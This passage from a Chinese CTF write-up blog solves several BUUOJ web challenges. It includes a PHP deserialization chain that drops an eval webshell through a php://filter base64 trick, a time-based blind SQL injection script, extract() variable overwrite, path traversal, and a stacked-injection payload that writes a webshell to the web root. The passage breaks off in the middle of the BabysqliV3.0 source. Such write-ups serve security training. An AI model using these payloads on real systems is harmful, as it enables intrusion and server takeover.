class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$contents</span> = <span class="hljs-keyword">$this</span>-&gt;getForStorage();<br><br>        <span class="hljs-keyword">$this</span>-&gt;store-&gt;set(<span class="hljs-keyword">$this</span>-&gt;key, <span class="hljs-variable">$contents</span>, <span class="hljs-keyword">$this</span>-&gt;expire);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;autosave) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;save();<br>        &#125;<br>    &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>     <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>): <span class="hljs-title">bool</span></span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;writeTimes++;<br><br>        <span class="hljs-keyword">if</span> (is_null(<span class="hljs-variable">$expire</span>)) &#123;<br>            <span class="hljs-variable">$expire</span> = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;expire&#x27;</span>];<br>        &#125;<br><br>        <span class="hljs-variable">$expire</span> = <span class="hljs-keyword">$this</span>-&gt;getExpireTime(<span class="hljs-variable">$expire</span>);<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-keyword">$this</span>-&gt;getCacheKey(<span class="hljs-variable">$name</span>);<br><br>        <span class="hljs-variable">$dir</span> = dirname(<span class="hljs-variable">$filename</span>);<br><br>        <span class="hljs-keyword">if</span> (!is_dir(<span class="hljs-variable">$dir</span>)) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                mkdir(<span class="hljs-variable">$dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                <span class="hljs-comment">// 创建失败</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;serialize(<span class="hljs-variable">$value</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;<br>            <span class="hljs-comment">//数据压缩</span><br>            <span class="hljs-variable">$data</span> = gzcompress(<span class="hljs-variable">$data</span>, <span class="hljs-number">3</span>);<br>        &#125;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="hljs-string">&#x27;%012d&#x27;</span>, <span class="hljs-variable">$expire</span>) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="hljs-variable">$data</span>;<br>        <span class="hljs-variable">$result</span> = file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>&#125;<br>&#125;<br>    <br></code></pre></td></tr></table></figure>

<p>A的析构函数会调用save函数，save函数中有 <code>$this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);</code></p>
<p>A类没有 set函数或者__get方法，但是B有，所以$this-&gt;store&#x3D;new B();</p>
<p>然后上面代码line 39，显然考察的是绕过死亡exit()，因此构造的shell要求长度是4的倍数，然后想data的值。data变量对应的A中的content变量。</p>
<p>content由<code> $contents = $this-&gt;getForStorage();</code> 后面的这个函数得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanContents</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$contents</span></span>) </span>&#123;   <span class="hljs-comment">//比较返回相同的数组</span><br>       <span class="hljs-variable">$cachedProperties</span> = array_flip([<br>           <span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;dirname&#x27;</span>, <span class="hljs-string">&#x27;basename&#x27;</span>, <span class="hljs-string">&#x27;extension&#x27;</span>, <span class="hljs-string">&#x27;filename&#x27;</span>,<br>           <span class="hljs-string">&#x27;size&#x27;</span>, <span class="hljs-string">&#x27;mimetype&#x27;</span>, <span class="hljs-string">&#x27;visibility&#x27;</span>, <span class="hljs-string">&#x27;timestamp&#x27;</span>, <span class="hljs-string">&#x27;type&#x27;</span>,<br>       ]);<br><br>       <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$contents</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$path</span> =&gt; <span class="hljs-variable">$object</span>) &#123;<br>           <span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$object</span>)) &#123;<br>               <span class="hljs-variable">$contents</span>[<span class="hljs-variable">$path</span>] = array_intersect_key(<span class="hljs-variable">$object</span>, <span class="hljs-variable">$cachedProperties</span>);<br>           &#125;<br>       &#125;<br><br>       <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getForStorage</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-comment">//转json格式</span><br>       <span class="hljs-variable">$cleaned</span> = <span class="hljs-keyword">$this</span>-&gt;cleanContents(<span class="hljs-keyword">$this</span>-&gt;cache);<br><br>       <span class="hljs-keyword">return</span> json_encode([<span class="hljs-variable">$cleaned</span>, <span class="hljs-keyword">$this</span>-&gt;complete]);<br>   &#125;<br></code></pre></td></tr></table></figure>

<p>下面的函数调用上面的，可以直接让content为一个空数组，然后complete为具体shell的值</p>
<p>那么</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">$this-&gt;complete = base64_encode(&quot;111&quot;.base64_encode(&#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27;));</span><br></code></pre></td></tr></table></figure>

<p>这里首先将webshellbase64编码，然后再用base64编码绕过死亡exit。为什么加了三个1？</p>
<p>因为base64解码过程中只认a-zA-z0-9+&#x2F;，所以这一段字符</p>
<p><code>&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n</code> 在解码过程中只认 <code>php//exit</code> 这里是9个字符，再补三位就是四的倍数。</p>
<p>然后看这个</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCacheKey</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] . <span class="hljs-variable">$name</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>这里不难看出 prefix可控 那name呢</p>
<p>结合上面想的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">//保存内容  A类</span><br>        <span class="hljs-variable">$contents</span> = <span class="hljs-keyword">$this</span>-&gt;getForStorage();<br>        <span class="hljs-keyword">$this</span>-&gt;store-&gt;set(<span class="hljs-keyword">$this</span>-&gt;key, <span class="hljs-variable">$contents</span>, <span class="hljs-keyword">$this</span>-&gt;expire);<br>    &#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>)  //<span class="hljs-title">B</span>类</span><br></code></pre></td></tr></table></figure>

<p>因为是从save触发 实际给到 B::set的第一个参数时A的key属性</p>
<p>这是可发现两者 prefix key都是可控的，于是可以有</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">options[<span class="hljs-string">&#x27;prefix&#x27;</span>]=<span class="hljs-string">&quot;php://filter/write=convert.base64-decode/resource=./uploads/&quot;</span>;<br>key=<span class="hljs-string">&quot;shell.php&quot;</span>; <span class="hljs-comment">//$name</span><br></code></pre></td></tr></table></figure>

<p>梳理一下内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">A：<br>    key=<span class="hljs-string">&quot;shell.php&quot;</span>;<br>	content=()<br>   complete = base64_encode(<span class="hljs-string">&quot;111&quot;</span>.base64_encode(<span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>));<br>    store=<span class="hljs-keyword">new</span> B();<br>B:<br>    b-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] = <span class="hljs-literal">false</span>;<br>	options[<span class="hljs-string">&#x27;prefix&#x27;</span>]=<span class="hljs-string">&quot;php://filter/write=convert.base64-decode/resource=./uploads/&quot;</span>;<br><br></code></pre></td></tr></table></figure>





















<h2 id="SWPU2019-Web4"><a href="#SWPU2019-Web4" class="headerlink" title="[SWPU2019]Web4"></a>[SWPU2019]Web4</h2><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202071745556.png" srcset="/img/loading.gif" lazyload alt="image-20220207174506463"></p>
<p>登录页面抓包，发现可以sql注入</p>
<p>这里结合 PDO预处理和盲注思想，给了一种新的思路</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#author: c1e4r</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> time<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-comment">#题目地址</span><br>    url = <span class="hljs-string">&#x27;&#x27;&#x27;http://ed59e513-784d-42b5-81d0-2c4dc976d086.node3.buuoj.cn/index.php?r=Login/Index&#x27;&#x27;&#x27;</span><br>    <span class="hljs-comment">#注入payload</span><br>    payloads = <span class="hljs-string">&quot;admin&#x27;;set @a=0x&#123;0&#125;;prepare b from @a;execute b--+&quot;</span><br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):<br>        <span class="hljs-comment">#查询payload</span><br>        payload = <span class="hljs-string">&quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">128</span>):<br>            <span class="hljs-comment">#将构造好的payload进行16进制转码和json转码</span><br>            datas = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payloads.<span class="hljs-built_in">format</span>(str_to_hex(payload.<span class="hljs-built_in">format</span>(i,j))),<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;test213&#x27;</span>&#125;<br>            data = json.dumps(datas)<br>            times = time.time()<br>            res = requests.post(url = url, data = data)<br>            <span class="hljs-keyword">if</span> time.time() - times &gt;= <span class="hljs-number">3</span>:<br>                flag = flag + <span class="hljs-built_in">chr</span>(j)<br>                <span class="hljs-built_in">print</span>(flag)<br>                <span class="hljs-keyword">break</span><br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_to_hex</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s])<br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>

<p>之后得到的文件名 glzjin_wants_a_girl_friend.zip</p>
<p>审计源码 在 \Controller\BaseController.php 发现</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseController</span></span><br><span class="hljs-class"></span>&#123;<br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * 加载视图文件</span><br><span class="hljs-comment">	 * viewName 视图名称</span><br><span class="hljs-comment">	 * viewData 视图分配数据</span><br><span class="hljs-comment">	*/</span><br>	<span class="hljs-keyword">private</span> <span class="hljs-variable">$viewPath</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadView</span>(<span class="hljs-params"><span class="hljs-variable">$viewName</span> =<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$viewData</span> = []</span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-keyword">$this</span>-&gt;viewPath = BASE_PATH . <span class="hljs-string">&quot;/View/<span class="hljs-subst">&#123;$viewName&#125;</span>.php&quot;</span>;<br>		<span class="hljs-keyword">if</span>(file_exists(<span class="hljs-keyword">$this</span>-&gt;viewPath))<br>		&#123;<br>			extract(<span class="hljs-variable">$viewData</span>);<br>			<span class="hljs-keyword">include</span> <span class="hljs-keyword">$this</span>-&gt;viewPath;<br>		&#125;<br>	&#125;<br>	<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里的extract可以变量覆盖，只要可控就可以覆盖点viewpath，然后看一下谁引用了这个类,然后跟进到   \Controller\UserController.php</p>
<p>这里有 <code>$this-&gt;loadView(&#39;userIndex&#39;,$listData);</code> 随后跟进 userIndex.phpz</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">imgToBase64</span>(<span class="hljs-params"><span class="hljs-variable">$img_file</span></span>) </span>&#123;<br><br>    <span class="hljs-variable">$img_base64</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (file_exists(<span class="hljs-variable">$img_file</span>)) &#123;<br>        <span class="hljs-variable">$app_img_file</span> = <span class="hljs-variable">$img_file</span>; <span class="hljs-comment">// 图片路径</span><br>        <span class="hljs-variable">$img_info</span> = getimagesize(<span class="hljs-variable">$app_img_file</span>); <span class="hljs-comment">// 取得图片的大小，类型等</span><br><br>        <span class="hljs-variable">$fp</span> = fopen(<span class="hljs-variable">$app_img_file</span>, <span class="hljs-string">&quot;r&quot;</span>); <span class="hljs-comment">// 图片是否可读权限</span><br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$fp</span>) &#123;<br>            <span class="hljs-variable">$filesize</span> = filesize(<span class="hljs-variable">$app_img_file</span>);<br>            <span class="hljs-variable">$content</span> = fread(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$filesize</span>);<br>            <span class="hljs-variable">$file_content</span> = chunk_split(base64_encode(<span class="hljs-variable">$content</span>)); <span class="hljs-comment">// base64编码</span><br>            <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$img_info</span>[<span class="hljs-number">2</span>]) &#123;           <span class="hljs-comment">//判读图片类型</span><br>						...	<br><br>            <span class="hljs-variable">$img_base64</span> = <span class="hljs-string">&#x27;data:image/&#x27;</span> . <span class="hljs-variable">$img_type</span> . <span class="hljs-string">&#x27;;base64,&#x27;</span> . <span class="hljs-variable">$file_content</span>;<span class="hljs-comment">//合成图片的base64编码</span><br><br>        &#125;<br>        fclose(<span class="hljs-variable">$fp</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$img_base64</span>; <span class="hljs-comment">//返回图片的base64</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这里就是返回Base64形式的图片，然后$listData可控，这个时候又用到了上面的变量覆盖</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadView</span>(<span class="hljs-params"><span class="hljs-variable">$viewName</span> =<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$viewData</span> = []</span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-keyword">$this</span>-&gt;viewPath = BASE_PATH . <span class="hljs-string">&quot;/View/<span class="hljs-subst">&#123;$viewName&#125;</span>.php&quot;</span>;<br>		<span class="hljs-keyword">if</span>(file_exists(<span class="hljs-keyword">$this</span>-&gt;viewPath))<br>		&#123;<br>			extract(<span class="hljs-variable">$viewData</span>);<br>			<span class="hljs-keyword">include</span> <span class="hljs-keyword">$this</span>-&gt;viewPath;<br>		&#125;<br>	&#125;<br></code></pre></td></tr></table></figure>

<p>这里自己加载的 &#x2F;View&#x2F; 文件夹下的文件，但是flag.php 在BASE_PATH下（根据目录结构得出），所以要返回上一级目录</p>
<p><code>?r=User/Index&amp;img_file=/../flag.php</code>  这…这个地方拿到的base64记得删除换行</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202071946757.png" srcset="/img/loading.gif" lazyload alt="image-20220207194629685"></p>
<h2 id="网鼎杯-2020-半决赛-AliceWebsite"><a href="#网鼎杯-2020-半决赛-AliceWebsite" class="headerlink" title="[网鼎杯 2020 半决赛]AliceWebsite"></a>[网鼎杯 2020 半决赛]AliceWebsite</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>     <span class="hljs-variable">$action</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] : <span class="hljs-string">&#x27;home.php&#x27;</span>);<br>     <span class="hljs-keyword">if</span> (file_exists(<span class="hljs-variable">$action</span>)) &#123;<br>         <span class="hljs-keyword">include</span> <span class="hljs-variable">$action</span>;<br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File not found!&quot;</span>;<br>     &#125;<br>     <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>http://4ef1b285-29ae-416e-8ca4-2b8add5da5de.node4.buuoj.cn:81/index.php?action=../../../flag</code></p>
<h2 id="SUCTF-2018-MultiSQL"><a href="#SUCTF-2018-MultiSQL" class="headerlink" title="[SUCTF 2018]MultiSQL"></a>[SUCTF 2018]MultiSQL</h2><p>是猜出来二次注入了，但是给我转义掉就不会了</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45691294/article/details/109001695">https://blog.csdn.net/qq_45691294/article/details/109001695</a></p>
<p>堆叠注入没太看出来…. 这里尝试用堆叠注入结合PDO写shell</p>
<p><code>select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39; into outfile &#39;/var/www/html/favicon/shell.php</code></p>
<p>原始payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;select &#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell.php&#x27;;&quot;</span><br>len_str=<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,len_str):<br>	<span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span>:<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;char(%s&#x27;</span>%<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i]),end=<span class="hljs-string">&quot;&quot;</span>)<br>	<span class="hljs-keyword">else</span>:<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;,%s&#x27;</span>%<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i]),end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;)&#x27;</span>)<br><span class="hljs-comment">#char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59)</span><br></code></pre></td></tr></table></figure>

<p><code>?id=3;set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @sql;execute query;</code></p>
<p>然后蚁剑连接即可</p>
<h2 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h2><p>u:admin    p:password</p>
<p>到达文件上传的地方发现可以读取源码</p>
<p><code>http://29fc5b9f-3437-4e77-8c04-9b780b878ab4.node4.buuoj.cn:81/home.php?file=php://filter/convert.base64-encode/resource=upload</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Uploader</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$Filename</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>	<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable">$sandbox</span> = getcwd().<span class="hljs-string">&quot;/uploads/&quot;</span>.md5(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]).<span class="hljs-string">&quot;/&quot;</span>;<br>		<span class="hljs-variable">$ext</span> = <span class="hljs-string">&quot;.txt&quot;</span>;<br>		@mkdir(<span class="hljs-variable">$sandbox</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);<br>		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> !preg_match(<span class="hljs-string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]))&#123;<br>			<span class="hljs-keyword">$this</span>-&gt;Filename = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>		&#125;<br>		<span class="hljs-keyword">else</span>&#123;<br>			<span class="hljs-keyword">$this</span>-&gt;Filename = <span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>].<span class="hljs-variable">$ext</span>;<br>		&#125;<br><br>		<span class="hljs-keyword">$this</span>-&gt;cmd = <span class="hljs-string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;<br>		<span class="hljs-keyword">$this</span>-&gt;token = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br>	&#125;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span 